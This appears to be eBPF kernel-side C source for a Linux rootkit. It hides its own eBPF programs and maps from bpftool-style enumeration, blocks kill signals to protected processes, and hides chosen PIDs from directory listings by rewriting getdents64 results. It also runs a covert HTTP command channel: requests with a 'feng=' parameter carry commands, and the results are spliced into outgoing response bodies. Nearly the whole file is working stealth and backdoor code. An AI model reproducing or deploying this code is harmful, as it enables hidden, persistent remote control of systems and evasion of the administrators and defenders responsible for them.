#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>
#include <bpf/bpf_endian.h>

#include "debug.h"
#include "event.h"
#include "memoryShell.h"
#include "hidePid.h"
#include "avoidKill.h"
#include "hideEbpf.h"
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////


char LICENSE[] SEC("license") = "Dual MIT/GPL";
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////


/*bpftool --help
        Usage: bpftool [OPTIONS] OBJECT { COMMAND | help }
bpftool batch file FILE
bpftool version

OBJECT := { prog | map | link | cgroup | perf | net | feature | btf | gen | struct_ops | iter }
OPTIONS := { {-j|--json} [{-p|--pretty}] | {-d|--debug} |
{-V|--version} }*/


//int bpf(int cmd, union bpf_attr *attr, unsigned int size);
/*[0000ffffb38e1aa8] bpf(BPF_PROG_GET_NEXT_ID, {start_id=0, next_id=0, open_flags=0}, 12) = 0
[0000ffffb38e1aa8] bpf(BPF_PROG_GET_FD_BY_ID, {prog_id=2, next_id=0, open_flags=0}, 12) = 3
[0000ffffb38e1aa8] bpf(BPF_OBJ_GET_INFO_BY_FD, {info={bpf_fd=3, info_len=232, info=0xffffc95ef490}}, 16) = 0*/
SEC("tp/syscalls/sys_enter_bpf")
int handleBpfEnter(struct trace_event_raw_sys_enter *ctx){
    s32 cmd = BPF_CORE_READ(ctx,args[0]);
    //liDEBUG_PRINT("cmd:%d",cmd);
    size_t pid_tgid = bpf_get_current_pid_tgid();
    if (cmd == BPF_PROG_GET_NEXT_ID||cmd == BPF_MAP_GET_NEXT_ID ||cmd == BPF_LINK_GET_NEXT_ID){
        bpf_map_update_elem(&mapHideEbpf,&pid_tgid,&cmd,BPF_ANY);
    }
    return 0;
}
SEC("kretprobe/sys_bpf")
int handleBpfExit(struct pt_regs *ctx) {

    size_t pid_tgid = bpf_get_current_pid_tgid();
    s32 *cmdPtr;
    cmdPtr = bpf_map_lookup_elem(&mapHideEbpf,&pid_tgid);
    if(cmdPtr == NULL)
        return 0;
    if (*cmdPtr!= BPF_PROG_GET_NEXT_ID&&*cmdPtr!=BPF_MAP_GET_NEXT_ID&&*cmdPtr!=BPF_LINK_GET_NEXT_ID)
        return 0;

    //DEBUG_PRINT("find BPF_PROG_GET_NEXT_ID");
    bpf_override_return(ctx,-ENOENT);
    bpf_map_delete_elem(&mapHideEbpf,&pid_tgid);
    return 0;
}




/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



SEC("lsm/task_kill")
int BPF_PROG(avoidKill,struct task_struct *p,
             struct kernel_siginfo *info, int sig,
             const struct cred *cred){
    pid_t pid = BPF_CORE_READ(p,tgid);
    struct task_struct *task = (struct task_struct *) bpf_get_current_task();
    pid_t ppid = BPF_CORE_READ(task,real_parent,tgid);


    for (u32 i = 0; i < MAX_PID_NUM; ++i) {
        if (pidAvoidKill[i]==-1)
            break;
        if (pidAvoidKill[i]==pid){
            u32 value = 1;
            bpf_map_update_elem(&mapAvoidKillPid,&ppid,&value,BPF_ANY);
            return -EPERM;
        }
    }
    return 0;
}

SEC("kretprobe/sys_kill")
int handleKillExit(struct pt_regs *ctx) {
    struct task_struct *task = (struct task_struct *) bpf_get_current_task();
    pid_t ppid = BPF_CORE_READ(task,real_parent,tgid);
    u32 *valuePtr = bpf_map_lookup_elem(&mapAvoidKillPid,&ppid);
    if(valuePtr == 0)
        return 0;
    if (*valuePtr!=1)
        return 0;

    bpf_override_return(ctx,-ESRCH);
    bpf_map_delete_elem(&mapAvoidKillPid,&ppid);

    return 0;
}

/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////




/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
SEC("tc")
int tcEgress(struct __sk_buff *ctx) {
    u32 zero = 0;
    u32 *nextSeq;
    nextSeq = bpf_map_lookup_elem(&mapSeq, &zero);

    //not receive cmd
    if (nextSeq == 0) {
        return TC_ACT_OK;
    }


    //bpf_skb_load_bytes
    void *data = (void *) (u64) ctx->data;
    void *dataEnd = (void *) (u64) ctx->data_end;


    // Parse Ethernet header
    struct ethhdr *eth = data;
    if (data + sizeof(struct ethhdr) > dataEnd)
        return TC_ACT_OK;

    if (bpf_ntohs(eth->h_proto) != ETH_P_IP)
        return TC_ACT_OK;

    // Parse IP header
    // Return the protocol of this packet
    // 1 = ICMP
    // 6 = TCP
    // 17 = UDP
    struct iphdr *iph = data + sizeof(struct ethhdr);
    if (data + sizeof(struct ethhdr) + sizeof(struct iphdr) > dataEnd)
        return TC_ACT_OK;


    // Check if the packet is TCP
    if (iph->protocol != IPPROTO_TCP)
        return TC_ACT_OK;

    // Parse TCP header
    struct tcphdr *tcp = (void *) iph + sizeof(*iph);
    if (data + sizeof(struct ethhdr) + sizeof(struct iphdr) + sizeof(struct tcphdr) > dataEnd)
        return TC_ACT_OK;


    u32 tcp_header_size = tcp->doff * 4;
    u8 *httpDataStart = (void *) tcp + tcp_header_size;
    u8 *httpDataEnd = (u8 *) dataEnd;


    // Check for HTTP payload
    // This is a very basic check for HTTP traffic
    if (httpDataStart + 1 > httpDataEnd)
        return TC_ACT_OK;


    //Determine if the response corresponding to the command request is carried
    if (bpf_ntohl(tcp->ack_seq) != *nextSeq) {
        //DEBUG_PRINT("no");
        return TC_ACT_OK;
    }

    //Consider that the http response is transmitted twice, once in the response header and once in the response body.
    //What should I do if the http response don't have a body????????????????????????????????????????????

    httpResCount++;
    u32 httpDataLength = httpDataEnd - httpDataStart;
    if (httpResCount == 1) {


        return TC_ACT_OK;
    }


    //httpResCount==2
    u8 *cmdResPtr = 0;
    cmdResPtr = bpf_map_lookup_elem(&mapCmdRes, &zero);
    if (cmdResPtr == 0) {
        DEBUG_PRINT("don't find the cmd!!!");
    }
    u32 baseOffset = sizeof(struct ethhdr) + sizeof(struct iphdr) + tcp_header_size;
    //DEBUG_PRINT("response body len:%d", httpDataLength);
    u32 numAdd = MAX_CMD_RES_LEN-httpDataLength%MAX_CMD_RES_LEN;
    //DEBUG_PRINT("numadd:%u",numAdd);
    s64 ret = bpf_skb_change_tail(ctx,baseOffset+httpDataLength+numAdd,0);

    if (ret != 0)
        DEBUG_PRINT("bpf_skb_change_tail error:%d", ret);


    /////////////////////////////////
    for (int i = 0; i < 16 * 4; ++i) {
        u8 localCmdRes[MAX_CMD_RES_LEN];
        __builtin_memset(localCmdRes, '\x00', MAX_CMD_RES_LEN);
        //include \x00,so +1
        s64 ret = bpf_probe_read_kernel_str(localCmdRes, MAX_CMD_RES_LEN+1, cmdResPtr + i * (MAX_CMD_RES_LEN));
        if (ret < 0) {
            DEBUG_PRINT("bpf_probe_read_user_str error,%d", ret);
        }

        ret = bpf_skb_store_bytes(ctx,
                                  baseOffset +
                                  i * (MAX_CMD_RES_LEN),
                                  &localCmdRes,
                                  MAX_CMD_RES_LEN,
                                  BPF_F_RECOMPUTE_CSUM);
        //DEBUG_PRINT("%s",httpDataStart);
        if (ret != 0){
            break;

        }
    }

    bpf_map_delete_elem(&mapCmdRes, &zero);
    bpf_map_delete_elem(&mapSeq, &zero);
    httpResCount = 0;




    return TC_ACT_OK;
}
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//xdp
//Ingress only
SEC("xdp")
int xdpHttpParser(struct xdp_md *ctx) {
    void *data = (void *) (u64) ctx->data;

    void *dataEnd = (void *) (u64) ctx->data_end;

    // Parse Ethernet header
    struct ethhdr *eth = data;
    if (data + sizeof(struct ethhdr) > dataEnd)
        return XDP_ABORTED;

    if (bpf_ntohs(eth->h_proto) != ETH_P_IP)
        return XDP_PASS;

    // Parse IP header
    // Return the protocol of this packet
    // 1 = ICMP
    // 6 = TCP
    // 17 = UDP
    struct iphdr *iph = data + sizeof(struct ethhdr);
    if (data + sizeof(struct ethhdr) + sizeof(struct iphdr) > dataEnd)
        return XDP_ABORTED;


    // Check if the packet is TCP
    if (iph->protocol != IPPROTO_TCP)
        return XDP_PASS;

    // Parse TCP header
    struct tcphdr *tcp = (void *) iph + sizeof(*iph);
    if (data + sizeof(struct ethhdr) + sizeof(struct iphdr) + sizeof(struct tcphdr) > dataEnd)
        return XDP_ABORTED;



    // Calculate TCP payload (HTTP data)

    u32 tcp_header_size = tcp->doff * 4;

    u8 *httpDataStart = (void *) tcp + tcp_header_size;
    u8 *httpDataEnd = (u8 *) dataEnd;


    // Check for HTTP payload
    // This is a very basic check for HTTP traffic
    if (httpDataStart + 4 > httpDataEnd)
        return XDP_PASS;

    //GET or POST
    //https???
    if (!(httpDataStart[0] == 'G' && httpDataStart[1] == 'E' && httpDataStart[2] == 'T') &&
        !(httpDataStart[0] == 'P' && httpDataStart[1] == 'O' && httpDataStart[2] == 'S' && httpDataStart[3] == 'T')) {
        return XDP_PASS;
    }
    //DEBUG_PRINT("xdp");
    // HTTP traffic identified
    u8 httpData[MAX_HTTP_LEN];


    //bpf_core_read_str(&httpData, sizeof(httpData), httpDataStart);
    bpf_core_read_str(&httpData, sizeof(httpData), httpDataStart + 5);
    //DEBUG_PRINT("receive http:\n\n%s", httpDataStart);
    //DEBUG_PRINT("receive http:\n\n%s", httpData);
    //s32 httpLength = (s32) (httpDataEnd - httpDataStart);


    u8 line[MAX_HTTP_LINE_LEN];
    __builtin_memset(line, '\x00', MAX_HTTP_LINE_LEN);
    //first line
    for (s32 rightIndex = 0; rightIndex < MAX_HTTP_LEN; ++rightIndex) {
        //DEBUG_PRINT("%c",httpData[rightIndex]);
        if (httpData[rightIndex] == '\r' && rightIndex - 9 >= 0) {
            //__builtin_memset(httpLine->line+rightIndex-1,'\x00',sizeof(httpLine->line)-rightIndex+1);
            //httpLine->line[rightIndex-1] = '\x00';
            //DEBUG_PRINT("%d",httpData[rightIndex-9]);
            httpData[rightIndex - 9] = '\x00';
            bpf_core_read_str(&line, sizeof(line), &httpData);
            //bpf_core_read_str(&httpLine->line, sizeof(httpLine->line), &httpData);
            break;
        }
    }
    //DEBUG_PRINT("%s",httpLine->line);
    //find feng
    for (s32 i = 0; i + 5 < MAX_HTTP_LINE_LEN; ++i) {
        if (line[i] == 'f' &&
            line[i + 1] == 'e' &&
            line[i + 2] == 'n' &&
            line[i + 3] == 'g' &&
            line[i + 4] == '=') {
            //bpf_core_read_str(&httpCmd->cmd,sizeof(httpCmd->cmd),line+i+5);
            //后续内核态怎么处理CMD?
            u32 httpLen = httpDataEnd - httpDataStart;
            u32 zero = 0;
            u32 nextSeq = bpf_htonl(tcp->seq) + httpLen;

            //
            u32 *nextSeqPtr = bpf_map_lookup_elem(&mapSeq, &zero);
            u8 *cmdRes = bpf_map_lookup_elem(&mapCmdRes, &zero);
            if (cmdRes != 0 && nextSeqPtr != 0 && *nextSeqPtr == nextSeq) {
                //DEBUG_PRINT("bpf_ringbuf_discard:%s",httpCmd->cmd);
                //bpf_ringbuf_discard(httpCmd,0);
                //bpf_map_delete_elem(&mapSeq,&zero);
                return XDP_PASS;
            }
            //first receive
            if (nextSeqPtr == 0) {
                struct httpCmd *httpCmd;
                httpCmd = bpf_ringbuf_reserve(&rb, sizeof(*httpCmd), 0);
                if (!httpCmd)
                    return XDP_PASS;
                httpCmd->type = 1;
                bpf_core_read_str(&httpCmd->cmd, sizeof(httpCmd->cmd), line + i + 5);
                bpf_map_update_elem(&mapSeq, &zero, &nextSeq, BPF_ANY);
                //DEBUG_PRINT("seq:%u,httpLen:%u,nextSeq:%u", bpf_htonl(tcp->seq),httpLen,nextSeq);
                bpf_ringbuf_submit(httpCmd, 0);
                return XDP_TX;
            }

            return XDP_TX;

        }
    }

    return XDP_PASS;
}


/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

// struct linux_dirent64 {
//     u64        d_ino;    /* 64-bit inode number */
//     u64        d_off;    /* 64-bit offset to next structure */
//     unsigned short d_reclen; /* Size of this dirent */
//     unsigned char  d_type;   /* File type */
//     char           d_name[]; /* Filename (null-terminated) */ };
// int getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);

SEC("tp/syscalls/sys_enter_getdents64")
int handleGetdentsEnter(struct trace_event_raw_sys_enter *ctx) {
    //DEBUG_PRINT("enter");
    size_t pid_tgid = bpf_get_current_pid_tgid();

    struct linux_dirent64 *dirp = (struct linux_dirent64 *) ctx->args[1];
    bpf_map_update_elem(&mapBuffs, &pid_tgid, &dirp, BPF_ANY);
    u32 zero = 0;
    bpf_map_update_elem(&mapPidIndex, &pid_tgid, &zero, BPF_ANY);
    return 0;
}


SEC("tp/syscalls/sys_exit_getdents64")
int handleGetdentsExit(struct trace_event_raw_sys_exit *ctx) {
    u64 pid_tgid = bpf_get_current_pid_tgid();

    int total_bytes_read = ctx->ret;
    // if bytes_read is 0, everything's been read
    if (total_bytes_read <= 0) {
        return 0;
    }


    // Check we stored the address of the buffer from the syscall entry
    long unsigned int *pbuff_addr = bpf_map_lookup_elem(&mapBuffs, &pid_tgid);
    if (pbuff_addr == 0) {
        return 0;
    }

    long unsigned int buff_addr = *pbuff_addr;
    struct linux_dirent64 *dirp = 0;
    //int pid = pid_tgid >> 32;
    short unsigned int d_reclen = 0;
    char filename[MAX_PID_LEN];

    unsigned int bpos = 0;
    unsigned int *pBPOS = bpf_map_lookup_elem(&mapBytesRead, &pid_tgid);
    if (pBPOS != 0) {
        bpos = *pBPOS;
    }

    u32 pidIndex = 0;
    u32 *pidIndexPtr = bpf_map_lookup_elem(&mapPidIndex, &pid_tgid);
    if (pidIndexPtr == NULL) {
        DEBUG_PRINT("pidIndexPtr is null");
        return 0;
    }
    pidIndex = *pidIndexPtr;
    if (pidIndex >= MAX_PID_NUM || pidIndex > pidNum) {
        DEBUG_PRINT("pidIndex is out of range,pidIndex:%d", pidIndex);
        return 0;
    }
    for (int i = 0; i < 200; i++) {
        if (bpos >= total_bytes_read) {
            break;
        }
        dirp = (struct linux_dirent64 *) (buff_addr + bpos);
        bpf_probe_read_user(&d_reclen, sizeof(d_reclen), &dirp->d_reclen);
        //bpf_probe_read_user_str(&filename, pidToHideLen, dirp->d_name);
        //bpf_printk("[PID_HIDE] filename:%s",filename);
        //bpf_core_read_user_str(&filename, pidToHideLen, dirp->d_name);
        BPF_CORE_READ_USER_STR_INTO(&filename, dirp, d_name);
        //bpf_printk("%s",filename);


        int j = 0;
        //verify :j<MAX_PID_LEN
        if (pidIndex >= MAX_PID_NUM || pidIndex > pidNum) {
            DEBUG_PRINT("pidIndex is out of range,pidIndex:%d", pidIndex);
            return 0;
        }



        for (j = 0; j < MAX_PID_LEN&&j < pidToHideLen[pidIndex]; j++) {
            if (filename[j] != pidToHide[pidIndex][j]) {
                break;
            }
        }

        if (j == pidToHideLen[pidIndex]) {
            //?
            //bpf_map_delete_elem(&map_bytes_read, &pid_tgid);
            //?
            //bpf_map_delete_elem(&map_buffs, &pid_tgid);
            long unsigned int *pbuff_addr_prev = bpf_map_lookup_elem(&mapToPatch, &pid_tgid);
            if (pbuff_addr_prev == 0) {
                return 0;
            }

            u64 buff_addr_prev = *pbuff_addr_prev;
            struct linux_dirent64 *dirp_previous = (struct linux_dirent64 *) buff_addr_prev;
            u32 d_reclen_previous = 0;
            bpf_probe_read_user(&d_reclen_previous, sizeof(d_reclen_previous), &dirp_previous->d_reclen);


            char filename_prev[MAX_PID_LEN];
            //bpf_probe_read_user_str(&filename_prev, pidToHideLen[pidIndex], dirp_previous->d_name);
            bpf_probe_read_user_str(&filename_prev, MAX_PID_LEN, dirp_previous->d_name);


            // Attempt to overwrite
            u32 d_reclen_new = d_reclen_previous + d_reclen;
            long ret = bpf_probe_write_user(&dirp_previous->d_reclen, &d_reclen_new, sizeof(d_reclen_new));

            // Send an event
            struct event *e;
            e = bpf_ringbuf_reserve(&rb, sizeof(*e), 0);
            if (e) {
                e->success = (ret == 0);
                e->pid = (pid_tgid >> 32);
                bpf_get_current_comm(&e->comm, sizeof(e->comm));
                e->type = 0;
                bpf_ringbuf_submit(e, 0);
            }

            bpf_map_delete_elem(&mapToPatch, &pid_tgid);
            pidIndex = pidIndex+1;
            if (pidNum == pidIndex) {
                goto clean;
            }
        }
        bpf_map_update_elem(&mapToPatch, &pid_tgid, &dirp, BPF_ANY);
        bpos += d_reclen;
    }

    if (bpos < total_bytes_read) {
        bpf_map_update_elem(&mapBytesRead, &pid_tgid, &bpos, BPF_ANY);
        bpf_map_update_elem(&mapPidIndex, &pid_tgid, &pidIndex, BPF_ANY);
        bpf_tail_call(ctx, &mapProgArray, PROG_01);
    }
    clean:
    bpf_map_delete_elem(&mapBytesRead, &pid_tgid);
    bpf_map_delete_elem(&mapBuffs, &pid_tgid);
    bpf_map_delete_elem(&mapToPatch, &pid_tgid);
    bpf_map_delete_elem(&mapPidIndex, &pid_tgid);
    return 0;
}
